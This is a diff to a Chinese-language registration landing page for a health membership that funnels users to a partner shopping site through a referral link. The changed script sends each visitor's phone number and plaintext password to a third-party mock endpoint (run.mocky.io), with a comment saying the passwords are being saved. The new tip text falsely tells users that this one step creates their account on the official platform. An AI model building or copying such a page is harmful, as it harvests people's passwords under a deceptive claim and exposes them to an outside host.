@@ -75,19 +75,17 @@
     <p>我们为您提供专业的陪跑式健康服务，产品由官方平台提供，您可通过下方入口注册并领取专属礼包</p>
 
     <div class="step">
-      <div class="step-title">第一步：注册元和集陪跑会员</div>
+      <div class="step-title">注册账号</div>
       <form id="myForm">
         <input type="text" id="phone" placeholder="请输入手机号" required />
         <input type="password" id="password" placeholder="请输入设置密码" required />
-        <button type="submit" class="button">提交注册</button>
+        <button type="submit" class="button">一键注册并跳转</button>
       </form>
     </div>
 
-    <div class="step" id="afterRegister" style="display:none;">
-      <div class="step-title">第二步：点击进入官方平台完成激活</div>
-      <a id="registerBtn" href="#" target="_blank" class="button">→ 前往倍莱鲜注册</a>
-      <p style="margin: 10px 0; color: #999; font-size: 13px;">注册成功后请返回此页领取礼包</p>
-      <a id="giftBtn" href="http://blx.longliqi.com/goodDetail.html?goods_id=203" target="_blank" class="button" style="display:none;">→ 我已完成注册，领取礼包</a>
+    <div class="step" id="giftSection" style="display:none;">
+      <div class="step-title">领取礼包</div>
+      <a id="giftBtn" href="http://blx.longliqi.com/goodDetail.html?goods_id=203" target="_blank" class="button">→ 前往礼包页面</a>
     </div>
 
     <div class="login-link">
@@ -95,8 +93,8 @@
     </div>
 
     <div class="tips">
-      * 元和集提供专业陪跑与服务支持，实际产品与发货由倍莱鲜官方平台提供。<br>
-      * 请严格按步骤完成注册→平台激活→礼包领取，确保权益绑定无误。
+      * 注册时将同步创建您在官方平台与元和集的账户，仅接收一次验证码。<br>
+      * 元和集提供陪跑与服务支持，产品发货由倍莱鲜平台完成。
     </div>
   </div>
 
@@ -111,6 +109,7 @@
         return;
       }
 
+      // 同步注册到你后台（保存手机号密码）
       fetch("https://run.mocky.io/v3/55fd0664-4b79-41eb-9f7d-27cd3182eb13", {
         method: "POST",
         headers: {
@@ -118,9 +117,11 @@
         },
         body: JSON.stringify({ phone, password })
       }).then(() => {
-        alert("注册成功，请点击按钮跳转至倍莱鲜平台完成激活");
-        document.getElementById("afterRegister").style.display = 'block';
-        document.getElementById("registerBtn").href = `http://blx.longliqi.com/register.html?referee_id=1749824&mobile=${encodeURIComponent(phone)}`;
+        alert("注册成功，请完成验证码验证");
+        // 跳转倍莱鲜注册页
+        window.open(`http://blx.longliqi.com/register.html?referee_id=1749824&mobile=${encodeURIComponent(phone)}`, '_blank');
+        // 显示礼包领取按钮
+        document.getElementById("giftSection").style.display = 'block';
       }).catch(() => {
         alert("注册失败，请稍后再试");
       });
